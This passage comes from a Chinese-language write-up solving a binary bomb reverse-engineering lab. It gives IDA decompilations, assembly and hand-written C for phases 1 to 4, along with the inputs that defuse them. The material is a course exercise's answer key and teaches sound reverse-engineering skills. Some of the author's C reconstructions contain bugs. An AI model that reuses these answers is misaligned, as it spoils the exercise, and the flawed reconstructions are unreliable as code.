LOBYTE ( flag ) = 1 ; if ( * a1 == * a2 ) { v5 = 0LL ; do { v6 = a1 [ v5 + 1 ]; if ( ! v6 ) return 0 ; ++ v5 ; } while ( v6 == a2 [ v5 ] ); flag = 1 ; } } } return flag ; } ASM 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 .text: 000000000040123 D ; =============== S U B R O U T I N E ======================================= .text: 000000000040123 D .text: 000000000040123 D .text: 000000000040123 D public strings_not_equal .text: 000000000040123 D strings_not_equal proc near ; CODE XREF: phase_1+9\u2191p .text: 000000000040123 D ; phase_defused+3A\u2193p .text: 000000000040123 D .text: 000000000040123 D var_18 = qword ptr - 18 h .text: 000000000040123 D var_10 = qword ptr - 10 h .text: 000000000040123 D var_8 = qword ptr - 8 .text: 000000000040123 D .text: 000000000040123 D ; __unwind { .text: 000000000040123 D mov [ rsp + var_18 ], rbx .text: 0000000000401242 mov [ rsp + var_10 ], rbp .text: 0000000000401247 mov [ rsp + var_8 ], r12 .text: 000000000040124 C sub rsp , 18 h .text: 0000000000401250 mov rbx , rdi .text: 0000000000401253 mov rbp , rsi .text: 0000000000401256 call string_length .text: 000000000040125 B mov r12d , eax .text: 000000000040125 E mov rdi , rbp .text: 0000000000401261 call string_length .text: 0000000000401266 mov edx , 1 .text: 000000000040126 B cmp r12d , eax .text: 000000000040126 E jnz short loc_4012A6 .text: 0000000000401270 movzx eax , byte ptr [ rbx ] .text: 0000000000401273 mov dl , 0 .text: 0000000000401275 test al , al .text: 0000000000401277 jz short loc_4012A6 .text: 0000000000401279 mov dl , 1 .text: 000000000040127 B cmp al , [ rbp + 0 ] .text: 000000000040127 E jnz short loc_4012A6 .text: 0000000000401280 mov eax , 0 .text: 0000000000401285 jmp short loc_401291 .text: 0000000000401287 ; --------------------------------------------------------------------------- .text: 0000000000401287 .text: 0000000000401287 loc_401287: ; CODE XREF: strings_not_equal+5B\u2193j .text: 0000000000401287 add rax , 1 .text: 000000000040128 B cmp dl , [ rbp + rax + 0 ] .text: 000000000040128 F jnz short loc_4012A1 .text: 0000000000401291 .text: 0000000000401291 loc_401291: ; CODE XREF: strings_not_equal+48\u2191j .text: 0000000000401291 movzx edx , byte ptr [ rbx + rax + 1 ] .text: 0000000000401296 test dl , dl .text: 0000000000401298 jnz short loc_401287 .text: 000000000040129 A mov edx , 0 .text: 000000000040129 F jmp short loc_4012A6 .text: 00000000004012 A1 ; --------------------------------------------------------------------------- .text: 00000000004012 A1 .text: 00000000004012 A1 loc_4012A1 : ; CODE XREF: strings_not_equal+52\u2191j .text: 00000000004012 A1 mov edx , 1 .text: 00000000004012 A6 .text: 00000000004012 A6 loc_4012A6 : ; CODE XREF: strings_not_equal+31\u2191j .text: 00000000004012 A6 ; strings_not_equal+3A\u2191j ... .text: 00000000004012 A6 mov eax , edx .text: 00000000004012 A8 mov rbx , [ rsp + 18 h + var_18 ] .text: 00000000004012 AC mov rbp , [ rsp + 18 h + var_10 ] .text: 00000000004012 B1 mov r12 , [ rsp + 18 h + var_8 ] .text: 00000000004012 B6 add rsp , 18 h .text: 00000000004012 BA retn .text: 00000000004012 BA ; } // starts at 40123D .text: 00000000004012 BA strings_not_equal endp .text: 00000000004012 BA C, decompiled by me 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 int strings_not_equal ( char str1 [], char str2 []) { int str1_length = string_length ( str1 ); int str2_length = string_length ( str2 ); int flag = 1 ; if ( str1_length == str2_length ) { flag = 0 ; if ( str1 [ 0 ] != '\\0' ) { flag = 1 ; if ( str1 [ 0 ] != str2 [ 0 ]) { int index = 0 ; while ( str1 [ index + 1 ] != '\\0' ) { if ( str1 [ index + 1 ] != str2 [ index + 1 ]) { return flag ; } } flag = 0 ; } } } return flag ; } \u5bf9\u4e8e string_length() \u6765\u8bf4\uff1a C, decompiled by IDA 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 __int64 __fastcall string_length ( _BYTE * a1 ) { __int64 result ; // rax _BYTE * v2 ; // rdx result = 0LL ; if ( * a1 ) { v2 = a1 ; do result = ( unsigned int )(( _DWORD ) ++ v2 - ( _DWORD ) a1 ); while ( * v2 ); } return result ; } ASM 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 .text: 0000000000401221 ; =============== S U B R O U T I N E ======================================= .text: 0000000000401221 .text: 0000000000401221 .text: 0000000000401221 public string_length .text: 0000000000401221 string_length proc near ; CODE XREF: strings_not_equal+19\u2193p .text: 0000000000401221 ; strings_not_equal+24\u2193p .text: 0000000000401221 ; __unwind { .text: 0000000000401221 mov eax , 0 .text: 0000000000401226 cmp byte ptr [ rdi ], 0 .text: 0000000000401229 jz short locret_40123B .text: 000000000040122 B mov rdx , rdi .text: 000000000040122 E .text: 000000000040122 E loc_40122E : ; CODE XREF: string_length+18\u2193j .text: 000000000040122 E add rdx , 1 .text: 0000000000401232 mov eax , edx .text: 0000000000401234 sub eax , edi .text: 0000000000401236 cmp byte ptr [ rdx ], 0 .text: 0000000000401239 jnz short loc_40122E .text: 000000000040123 B .text: 000000000040123 B locret_40123B : ; CODE XREF: string_length+8\u2191j .text: 000000000040123 B rep retn .text: 000000000040123 B ; } // starts at 401221 .text: 000000000040123 B string_length endp .text: 000000000040123 B C, decompiled by me 1 2 3 4 5 6 7 8 9 10 11 int string_length ( char str []) { int length = 0 ; if ( str [ 0 ] != '\\0' ) { char * ptr = str ; while ( * ptr != '\\0' ) { ptr += 1 ; length = ptr - str ; } } return length ; } \u6240\u4ee5\uff0c\u6211\u4eec\u53ea\u9700\u8981\u8f93\u5165\uff1a 1 Science isn 't about why, it' s about why not ? \u5c31\u53ef\u4ee5\u901a\u8fc7\u7b2c\u4e00\u4e2acheck\u3002 phase_2() \u5148\u53cc\u51fb\u8fdb\u6765\u770b\u770b\uff0c\u770b\u4e86\u4e2a\u5927\u6982\uff0c\u7136\u540e\u968f\u4fbf\u8f936\u4e2a\u6570\u5f00\u59cb\u6162\u6162\u8c03\uff1a Tip \u55ef\uff0c\u6ca1\u9519\uff0c\u5c31\u662f\u5148\u968f\u4fbf\u7ed96\u4e2a\u6570\u3002\u5373\u4f7f\u8fd96\u4e2a\u6570\u672c\u8eab\u4e0d\u80fd\u901a\u8fc7check\u4e5f\u65e0\u6240\u8c13\uff0c\u6211\u4eec\u7684\u4e3b\u8981\u76ee\u7684\u662f\u8c03\u8bd5\u7684\u65f6\u5019\u770b\u5b83\u5982\u4f55\u8fdb\u884c\u6bd4\u8f83\u7b49\u8fd0\u7b97\u7684\u3002\u5982\u679c\u5b83\u8981\u70b8\u4e86\uff0c\u4f60\u53ea\u9700\u8981\u6539\u53d8\u76f8\u5e94\u7684\u8df3\u8f6cflag\u8ba9\u5b83\u56de\u5f52\u6b63\u8f68\u5c31\u53ef\u4ee5\u4e86\uff0c\u4f46\u662f\u522b\u5fd8\u8bb0\u4e86\u8981\u8bb0\u4e0b\u5b83\u7684\u7b97\u6cd5\uff0c\u4f60\u9700\u8981\u8bb0\u4e0b\u6765\u624d\u80fd\u5728\u6ca1\u6709\u8c03\u8bd5\u5668\u7684\u65f6\u5019\u901a\u8fc7check\u3002 C, decompiled by IDA 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 __int64 __fastcall phase_2 ( __int64 a1 ) { char * v1 ; // rbp int v2 ; // er12 __int64 result ; // rax __int64 v4 ; // [rsp+0h] [rbp-48h] char v5 ; // [rsp+Ch] [rbp-3Ch] read_six_numbers ( a1 , ( __int64 ) & v4 ); v1 = ( char * ) & v4 ; v2 = 0 ; do { result = * (( unsigned int * ) v1 + 3 ); if ( * ( _DWORD * ) v1 != ( _DWORD ) result ) explode_bomb ( a1 , & v4 ); v2 += * ( _DWORD * ) v1 ; v1 += 4 ; } while ( v1 != & v5 ); if ( ! v2 ) explode_bomb ( a1 , & v4 ); return result ; } ASM 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 .text: 0000000000400 E8C ; =============== S U B R O U T I N E ======================================= .text: 0000000000400 E8C .text: 0000000000400 E8C .text: 0000000000400 E8C public phase_2 .text: 0000000000400 E8C phase_2 proc near ; CODE XREF: main+AC\u2191p .text: 0000000000400 E8C .text: 0000000000400 E8C var_3C = byte ptr - 3 Ch .text: 0000000000400 E8C var_20 = qword ptr - 20 h .text: 0000000000400 E8C var_18 = qword ptr - 18 h .text: 0000000000400 E8C var_10 = qword ptr - 10 h .text: 0000000000400 E8C var_8 = qword ptr - 8 .text: 0000000000400 E8C .text: 0000000000400 E8C ; __unwind { .text: 0000000000400 E8C mov [ rsp + var_20 ], rbx .text: 0000000000400 E91 mov [ rsp + var_18 ], rbp .text: 0000000000400 E96 mov [ rsp + var_10 ], r12 .text: 0000000000400 E9B mov [ rsp + var_8 ], r13 .text: 0000000000400 EA0 sub rsp , 48 h .text: 0000000000400 EA4 mov rsi , rsp .text: 0000000000400 EA7 call read_six_numbers .text: 0000000000400 EAC mov rbp , rsp .text: 0000000000400 EAF lea r13 , [ rsp + 48 h + var_3C ] .text: 0000000000400 EB4 mov r12d , 0 .text: 0000000000400 EBA .text: 0000000000400 EBA loc_400EBA : ; CODE XREF: phase_2+48\u2193j .text: 0000000000400 EBA mov rbx , rbp .text: 0000000000400 EBD mov eax , [ rbp + 0 Ch ] .text: 0000000000400 EC0 cmp [ rbp + 0 ], eax .text: 0000000000400 EC3 jz short loc_400ECA .text: 0000000000400 EC5 call explode_bomb .text: 0000000000400 ECA ; --------------------------------------------------------------------------- .text: 0000000000400 ECA .text: 0000000000400 ECA loc_400ECA : ; CODE XREF: phase_2+37\u2191j .text: 0000000000400 ECA add r12d , [ rbx ] .text: 0000000000400 ECD add rbp , 4 .text: 0000000000400 ED1 cmp rbp , r13 .text: 0000000000400 ED4 jnz short loc_400EBA .text: 0000000000400 ED6 test r12d , r12d .text: 0000000000400 ED9 jnz short loc_400EE0 .text: 0000000000400 EDB call explode_bomb .text: 0000000000400 EE0 ; --------------------------------------------------------------------------- .text: 0000000000400 EE0 .text: 0000000000400 EE0 loc_400EE0 : ; CODE XREF: phase_2+4D\u2191j .text: 0000000000400 EE0 mov rbx , [ rsp + 48 h + var_20 ] .text: 0000000000400 EE5 mov rbp , [ rsp + 48 h + var_18 ] .text: 0000000000400 EEA mov r12 , [ rsp + 48 h + var_10 ] .text: 0000000000400 EEF mov r13 , [ rsp + 48 h + var_8 ] .text: 0000000000400 EF4 add rsp , 48 h .text: 0000000000400 EF8 retn .text: 0000000000400 EF8 ; } // starts at 400E8C .text: 0000000000400 EF8 phase_2 endp .text: 0000000000400 EF8 C, decompiled by me 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 void phase_2 () { int array [ 6 ]; read_six_numbers ( arg1 , array ); int sum = 0 ; int * ptr = arrray ; while ( ptr != ( array + 3 )) { if ( ptr [ 0 ] != ptr [ 3 ]) { explode_bomb (); } sum += * ptr ; ptr += 1 ; } if ( sum == 0 ) { explode_bomb (); } } \u5bf9\u4e86\uff0c\u5e0c\u671b\u4f60\u5df2\u7ecf\u77e5\u9053\u4e86 a[i] \u662f *(a+i) \u7684\u8bed\u6cd5\u7cd6\u3002 \u770b\u8d77\u6765\u50cf\u662f\u8f93\u51656\u4e2a\u6570\u5b57\uff0c\u524d\u4e09\u4e2a\u548c\u540e\u4e09\u4e2a\u9700\u8981\u5206\u522b\u76f8\u7b49\uff0c \u5e76\u4e14\u4e0d\u80fd\u5168\u4e3a0 \u66f4\u65b0\uff1a6\u4e2a\u6570\u7d2f\u52a0\u548c\u4e0d\u80fd\u4e3a0\uff08\u611f\u8c22\u63d0\u9192\uff09\u3002 \u53e6\u5916\uff0c\u518d\u770b\u770b read_six_numbers() \uff1a C, decompiled by IDA 1 2 3 4 5 6 7 8 9 __int64 __fastcall read_six_numbers ( __int64 a1 , __int64 a2 ) { __int64 result ; // rax result = __isoc99_sscanf ( a1 , & unk_401EB2 , a2 , a2 + 4 , a2 + 8 , a2 + 12 ); if ( ( signed int ) result <= 5 ) explode_bomb ( a1 , & unk_401EB2 ); return result ; } ASM 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 .text: 0000000000401743 ; =============== S U B R O U T I N E ======================================= .text: 0000000000401743 .text: 0000000000401743 .text: 0000000000401743 public read_six_numbers .text: 0000000000401743 read_six_numbers proc near ; CODE XREF: phase_2+1B\u2191p .text: 0000000000401743 .text: 0000000000401743 var_18 = qword ptr - 18 h .text: 0000000000401743 var_10 = qword ptr - 10 h .text: 0000000000401743 .text: 0000000000401743 ; __unwind { .text: 0000000000401743 sub rsp , 18 h .text: 0000000000401747 mov rdx , rsi .text: 000000000040174 A lea rcx , [ rsi + 4 ] .text: 000000000040174 E lea rax , [ rsi + 14 h ] .text: 0000000000401752 mov [ rsp + 18 h + var_10 ], rax .text: 0000000000401757 lea rax , [ rsi + 10 h ] .text: 000000000040175 B mov [ rsp + 18 h + var_18 ], rax .text: 000000000040175 F lea r9 , [ rsi + 0 Ch ] .text: 0000000000401763 lea r8 , [ rsi + 8 ] .text: 0000000000401767 mov esi , offset unk_401EB2 .text: 000000000040176 C mov eax , 0 .text: 0000000000401771 call ___isoc99_sscanf .text: 0000000000401776 cmp eax , 5 .text: 0000000000401779 jg short loc_401780 .text: 000000000040177 B call explode_bomb .text: 0000000000401780 ; --------------------------------------------------------------------------- .text: 0000000000401780 .text: 0000000000401780 loc_401780: ; CODE XREF: read_six_numbers+36\u2191j .text: 0000000000401780 add rsp , 18 h .text: 0000000000401784 retn .text: 0000000000401784 ; } // starts at 401743 .text: 0000000000401784 read_six_numbers endp .text: 0000000000401784 C, decompiled by me 1 2 3 4 5 6 // \uff08\u7701\u7565\u4e86\u90e8\u5206\u5185\u5bb9\uff09 void read_six_numbers ( char arg1 [], int array []) { if ( scanf ( \"%d %d %d %d %d %d\" , array , array + 1 , array + 2 , array + 3 , array + 4 , array + 5 ) <= 5 ) { explode_bomb (); } } \u7efc\u4e0a\uff0c\u968f\u610f\u6784\u9020\u524d\u4e09\u4e2a\u548c\u540e\u4e09\u4e2a\u6570\u5b57\u5206\u522b\u76f8\u7b49\u4e14 \u4e0d\u5168\u4e3a0 \u7d2f\u52a0\u548c\u4e0d\u4e3a0\u7684\u516d\u4e2a\u6570\u5b57\u5373\u53ef\uff0c\u4f8b\u5982\uff1a 1 1 2 3 1 2 3 \u5e94\u8be5\u80fd\u901a\u8fc7\u7b2c\u4e8c\u4e2acheck\u3002 phase_3() \u8fd9\u5173\u4e3b\u8981\u662f switch \u548c\u8df3\u8f6c\u8868\u3002 C, decompiled by IDA 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 signed __int64 __fastcall phase_3 ( __int64 a1 , __int64 a2 , __int64 a3 , __int64 a4 , __int64 a5 , __int64 a6 ) { signed __int64 result ; // rax int v7 ; // [rsp+8h] [rbp-10h] int v8 ; // [rsp+Ch] [rbp-Ch] if ( ( signed int ) __isoc99_sscanf ( a1 , \"%d %d\" , & v8 , & v7 , a5 , a6 ) <= 1 ) explode_bomb ( a1 , \"%d %d\" ); switch ( v8 ) { case 0 : result = 535LL ; break ; case 1 : result = 926LL ; break ; case 2 : result = 214LL ; break ; case 3 : result = 339LL ; break ; case 4 : result = 119LL ; break ; case 5 : result = 352LL ; break ; case 6 : result = 919LL ; break ; case 7 : result = 412LL ; break ; default : explode_bomb ( a1 , \"%d %d\" ); return result ; } if ( ( _DWORD ) result != v7 ) explode_bomb ( a1 , \"%d %d\" ); return result ; } ASM 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 .text: 0000000000400 EF9 ; =============== S U B R O U T I N E ======================================= .text: 0000000000400 EF9 .text: 0000000000400 EF9 .text: 0000000000400 EF9 public phase_3 .text: 0000000000400 EF9 phase_3 proc near ; CODE XREF: main+C8\u2191p .text: 0000000000400 EF9 .text: 0000000000400 EF9 var_10 = dword ptr - 10 h .text: 0000000000400 EF9 var_C = dword ptr - 0 Ch .text: 0000000000400 EF9 .text: 0000000000400 EF9 ; __unwind { .text: 0000000000400 EF9 sub rsp , 18 h .text: 0000000000400 EFD lea rcx , [ rsp + 18 h + var_10 ] .text: 0000000000400 F02 lea rdx , [ rsp + 18 h + var_C ] .text: 0000000000400 F07 mov esi , offset aDD ; \"%d %d\" .text: 0000000000400 F0C mov eax , 0 .text: 0000000000400 F11 call ___isoc99_sscanf .text: 0000000000400 F16 cmp eax , 1 .text: 0000000000400 F19 jg short loc_400F20 .text: 0000000000400 F1B call explode_bomb .text: 0000000000400 F20 ; --------------------------------------------------------------------------- .text: 0000000000400 F20 .text: 0000000000400 F20 loc_400F20 : ; CODE XREF: phase_3+20\u2191j .text: 0000000000400 F20 cmp [ rsp + 18 h + var_C ], 7 ; switch 8 cases .text: 0000000000400 F25 ja short loc_400F63 ; jumptable 0000000000400F2B default case .text: 0000000000400 F27 mov eax , [ rsp + 18 h + var_C ] .text: 0000000000400 F2B jmp ds : off_401B60 [ rax * 8 ] ; switch jump .text: 0000000000400 F32 ; --------------------------------------------------------------------------- .text: 0000000000400 F32 .text: 0000000000400 F32 loc_400F32 : ; CODE XREF: phase_3+32\u2191j .text: 0000000000400 F32 ; DATA XREF: .rodata:off_401B60\u2193o .text: 0000000000400 F32 mov eax , 217 h ; jumptable 0000000000400F2B case 0 .text: 0000000000400 F37 jmp short loc_400F74 .text: 0000000000400 F39 ; --------------------------------------------------------------------------- .text: 0000000000400 F39 .text: 0000000000400 F39 loc_400F39 : ; CODE XREF: phase_3+32\u2191j .text: 0000000000400 F39 ; DATA XREF: .rodata:off_401B60\u2193o .text: 0000000000400 F39 mov eax , 0 D6h ; jumptable 0000000000400F2B case 2 .text: 0000000000400 F3E jmp short loc_400F74 .text: 0000000000400 F40 ; --------------------------------------------------------------------------- .text: 0000000000400 F40 .text: 0000000000400 F40 loc_400F40 : ; CODE XREF: phase_3+32\u2191j .text: 0000000000400 F40 ; DATA XREF: .rodata:off_401B60\u2193o .text: 0000000000400 F40 mov eax , 153 h ; jumptable 0000000000400F2B case 3 .text: 0000000000400 F45 jmp short loc_400F74 .text: 0000000000400 F47 ; --------------------------------------------------------------------------- .text: 0000000000400 F47 .text: 0000000000400 F47 loc_400F47 : ; CODE XREF: phase_3+32\u2191j .text: 0000000000400 F47 ; DATA XREF: .rodata:off_401B60\u2193o .text: 0000000000400 F47 mov eax , 77 h ; jumptable 0000000000400F2B case 4 .text: 0000000000400 F4C jmp short loc_400F74 .text: 0000000000400 F4E ; --------------------------------------------------------------------------- .text: 0000000000400 F4E .text: 0000000000400 F4E loc_400F4E : ; CODE XREF: phase_3+32\u2191j .text: 0000000000400 F4E ; DATA XREF: .rodata:off_401B60\u2193o .text: 0000000000400 F4E mov eax , 160 h ; jumptable 0000000000400F2B case 5 .text: 0000000000400 F53 jmp short loc_400F74 .text: 0000000000400 F55 ; --------------------------------------------------------------------------- .text: 0000000000400 F55 .text: 0000000000400 F55 loc_400F55 : ; CODE XREF: phase_3+32\u2191j .text: 0000000000400 F55 ; DATA XREF: .rodata:off_401B60\u2193o .text: 0000000000400 F55 mov eax , 397 h ; jumptable 0000000000400F2B case 6 .text: 0000000000400 F5A jmp short loc_400F74 .text: 0000000000400 F5C ; --------------------------------------------------------------------------- .text: 0000000000400 F5C .text: 0000000000400 F5C loc_400F5C : ; CODE XREF: phase_3+32\u2191j .text: 0000000000400 F5C ; DATA XREF: .rodata:off_401B60\u2193o .text: 0000000000400 F5C mov eax , 19 Ch ; jumptable 0000000000400F2B case 7 .text: 0000000000400 F61 jmp short loc_400F74 .text: 0000000000400 F63 ; --------------------------------------------------------------------------- .text: 0000000000400 F63 .text: 0000000000400 F63 loc_400F63 : ; CODE XREF: phase_3+2C\u2191j .text: 0000000000400 F63 call explode_bomb ; jumptable 0000000000400F2B default case .text: 0000000000400 F68 ; --------------------------------------------------------------------------- .text: 0000000000400 F68 mov eax , 0 .text: 0000000000400 F6D jmp short loc_400F74 .text: 0000000000400 F6F ; --------------------------------------------------------------------------- .text: 0000000000400 F6F .text: 0000000000400 F6F loc_400F6F : ; CODE XREF: phase_3+32\u2191j .text: 0000000000400 F6F ; DATA XREF: .rodata:off_401B60\u2193o .text: 0000000000400 F6F mov eax , 39 Eh ; jumptable 0000000000400F2B case 1 .text: 0000000000400 F74 .text: 0000000000400 F74 loc_400F74 : ; CODE XREF: phase_3+3E\u2191j .text: 0000000000400 F74 ; phase_3+45\u2191j ... .text: 0000000000400 F74 cmp eax , [ rsp + 18 h + var_10 ] .text: 0000000000400 F78 jz short loc_400F7F .text: 0000000000400 F7A call explode_bomb .text: 0000000000400 F7F ; --------------------------------------------------------------------------- .text: 0000000000400 F7F .text: 0000000000400 F7F loc_400F7F : ; CODE XREF: phase_3+7F\u2191j .text: 0000000000400 F7F add rsp , 18 h .text: 0000000000400 F83 retn .text: 0000000000400 F83 ; } // starts at 400EF9 .text: 0000000000400 F83 phase_3 endp .text: 0000000000400 F83 Warning \u8df3\u8f6c\u8868\u5185\u7684\u5730\u5740\u7684\u201c\u987a\u5e8f\u201d\u4e0d\u603b\u662f\u548c\u4f60\u60f3\u8c61\u7684\u4e00\u6837\u3002:-) \u9644\u4e0a\u8df3\u8f6c\u8868\uff0c\u5404\u4f4d\u81ea\u884c\u5bf9\u7167\u7740\u4e0a\u9762\u770b\u5427\u3002 1 2 3 4 5 6 7 8 . rodata : 0000000000401 B60 off_401B60 dq offset loc_400F32 ; DATA XREF: phase_3+32\u2191r . rodata : 0000000000401 B60 dq offset loc_400F6F ; jump table for switch statement . rodata : 0000000000401 B60 dq offset loc_400F39 . rodata : 0000000000401 B60 dq offset loc_400F40 . rodata : 0000000000401 B60 dq offset loc_400F47 . rodata : 0000000000401 B60 dq offset loc_400F4E . rodata : 0000000000401 B60 dq offset loc_400F55 . rodata : 0000000000401 B60 dq offset loc_400F5C \u7efc\u4e0a\uff0c\u5f53\u524d\u5173\u5361\u9700\u8981\u8f93\u5165\u4e24\u4e2a\u6574\u6570\uff0c\u8fd9\u4e24\u4e2a\u6574\u6570\u9700\u8981\u4e3a\uff1a 1 2 3 4 5 6 7 8 0 535 1 926 2 214 3 339 4 119 5 352 6 919 7 412 \u4e2d\u7684\u4e00\u5bf9\uff0c\u5426\u5219\u5c06\u4f1a\u8c03\u7528 explode_bomb() \u5f15\u7206\u70b8\u5f39\u3002 \u6240\u4ee5\uff0c\u7ed9\u51fa\u4e0a\u8ff0\u6574\u6570\u5bf9\u4e2d\u7684\u4efb\u610f\u4e00\u5bf9\u5373\u53ef\u901a\u8fc7\u7b2c\u4e09\u4e2acheck\u3002 phase_4() \u7ee7\u7eed\u6b65\u8fdb\uff1a C, decompiled by IDA 1 2 3 4 5 6 7 8 9 10 11 12 13 14 __int64 __fastcall phase_4 ( __int64 a1 , __int64 a2 , __int64 a3 , __int64 a4 , __int64 a5 , __int64 a6 ) { __int64 v6 ; // rdi __int64 result ; // rax int v8 ; // [rsp+Ch] [rbp-Ch] if ( ( unsigned int ) __isoc99_sscanf ( a1 , 4202177LL , & v8 , a4 , a5 , a6 ) != 1 || v8 <= 0 ) explode_bomb ( a1 , 4202177LL ); v6 = ( unsigned int ) v8 ; result = func4 ( v8 , 4202177LL ); if ( ( _DWORD ) result != 55 ) explode_bomb ( v6 , 4202177LL ); return result ; } ASM 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 .text: 0000000000400 FC1 ; =============== S U B R O U T I N E ======================================= .text: 0000000000400 FC1 .text: 0000000000400 FC1 .text: 0000000000400 FC1 public phase_4 .text: 0000000000400 FC1 phase_4 proc near ; CODE XREF: main+E4\u2191p .text: 0000000000400 FC1 .text: 0000000000400 FC1 var_C = dword ptr - 0 Ch .text: 0000000000400 FC1 .text: 0000000000400 FC1 ; __unwind { .text: 0000000000400 FC1 sub rsp , 18 h .text: 0000000000400 FC5 lea rdx , [ rsp + 18 h + var_C ] .text: 0000000000400 FCA mov esi , 401 EC1h .text: 0000000000400 FCF mov eax , 0 .text: 0000000000400 FD4 call ___isoc99_sscanf .text: 0000000000400 FD9 cmp eax , 1 .text: 0000000000400 FDC jnz short loc_400FE5 .text: 0000000000400 FDE cmp [ rsp + 18 h + var_C ], 0 .text: 0000000000400 FE3 jg short loc_400FEA .text: 0000000000400 FE5 .text: 0000000000400 FE5 loc_400FE5 : ; CODE XREF: phase_4+1B\u2191j .text: 0000000000400 FE5 call explode_bomb .text: 0000000000400 FEA ; --------------------------------------------------------------------------- .text: 0000000000400 FEA .text: 0000000000400 FEA loc_400FEA : ; CODE XREF: phase_4+22\u2191j .text: 0000000000400 FEA mov edi , [ rsp + 18 h + var_C ] .text: 0000000000400 FEE call func4 .text: 0000000000400 FF3 cmp eax , 37 h .text: 0000000000400 FF6 jz short loc_400FFD .text: 0000000000400 FF8 call explode_bomb .text: 0000000000400 FFD ; --------------------------------------------------------------------------- .text: 0000000000400 FFD .text: 0000000000400 FFD loc_400FFD : ; CODE XREF: phase_4+35\u2191j .text: 0000000000400 FFD add rsp , 18 h .text: 0000000000401001 retn .text: 0000000000401001 ; } // starts at 400FC1 .text: 0000000000401001 phase_4 endp .text: 0000000000401001 C, decompiled by me 1 2 3 4 5 6 7 8 9 void phase_4 () { int number ; if ( scanf ( \"%d\" , & number ) != 1 || number <= 0 ) { explode_bomb (); } if ( func4 ( number ) != 55 ) { explode_bomb (); } } \u8fd9\u770b\u8d77\u6765\u50cf\u662f\u9700\u8981\u8f93\u5165\u4e00\u4e2a\u975e\u8d1f\u6574\u6570\uff0c\u8ba9\u5b83\u7ecf\u8fc7 func4() \u8ba1\u7b97\u540e\u5f97\u5230 55 \uff0c\u5426\u5219\u5c31\u4f1a\u89e6\u53d1 explode_bomb() \u5f15\u7206\u70b8\u5f39\u3002\u6240\u4ee5\u6211\u4eec\u6765\u770b\u770b func4() \u91cc\u9762\u6709\u4ec0\u4e48\uff1a C, decompiled by IDA 1 2 3 4 5 6 7 8 9 10 11 12 13 signed __int64 __fastcall func4 ( signed int a1 , __int64 a2 ) { signed __int64 result ; // rax int v3 ; // ebp result = 1LL ; if ( a1 > 1 ) { v3 = func4 (( unsigned int )( a1 - 1 ), a2 ); result = v3 + ( unsigned int ) func4 (( unsigned int )( a1 - 2 ), a2 ); } return result ; } ASM 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 .text: 0000000000400 F84 ; =============== S U B R O U T I N E ======================================= .text: 0000000000400 F84 .text: 0000000000400 F84 .text: 0000000000400 F84 public func4 .text: 0000000000400 F84 func4 proc near ; CODE XREF: func4+1D\u2193p .text: 0000000000400 F84 ; func4+27\u2193p ... .text: 0000000000400 F84 .text: 0000000000400 F84 var_10 = qword ptr - 10 h .text: 0000000000400 F84 var_8 = qword ptr - 8 .text: 0000000000400 F84 .text: 0000000000400 F84 ; __unwind { .text: 0000000000400 F84 mov [ rsp + var_10 ], rbx .text: 0000000000400 F89 mov [ rsp + var_8 ], rbp .text: 0000000000400 F8E sub rsp , 18 h .text: 0000000000400 F92 mov ebx , edi .text: 0000000000400 F94 mov eax , 1 .text: 0000000000400 F99 cmp edi , 1 .text: 0000000000400 F9C jle short loc_400FB2 .text: 0000000000400 F9E lea edi , [ rbx-1 ] .text: 0000000000400 FA1 call func4 .text: 0000000000400 FA6 mov ebp , eax .text: 0000000000400 FA8 lea edi , [ rbx-2 ] .text: 0000000000400 FAB call func4 .text: 0000000000400 FB0 add eax , ebp .text: 0000000000400 FB2 .text: 0000000000400 FB2 loc_400FB2 : ; CODE XREF: func4+18\u2191j .text: 0000000000400 FB2 mov rbx , [ rsp + 18 h + var_10 ] .text: 0000000000400 FB7 mov rbp , [ rsp + 18 h + var_8 ] .text: 0000000000400 FBC add rsp , 18 h .text: 0000000000400 FC0 retn .text: 0000000000400 FC0 ; } // starts at 400F84 .text: 0000000000400 FC0 func4 endp .text: 0000000000400 FC0 C, decompiled by me 1 2 3 4 5 6 int func4 ( int number ) { if ( number <= 1 ) { return 1 ; } return func4 ( number - 1 ) + func4 ( number - 2 ); } \u66f4\u65b0\uff1a\u4ee3\u7801\u66f4\u6b63\u4e86\u4e00\u4e0b\uff0c\u611f\u8c22\u63d0\u9192\u3002\u4f46\u6211\u8fd8\u662f\u5efa\u8bae\u770bIDA\u9006\u7684\u800c\u4e0d\u662f\u6211\u7684\u3002\u53e6\u5916\uff0c\u914d\u5408\u7740\u8c03\u8bd5\u6548\u679c\u66f4\u4f73\uff0c\u6709\u5173\u5982\u4f55\u8c03\u8bd5\u7684\u6587\u7ae0\u5df2\u7ecf\u53d1\u5e03\u3002 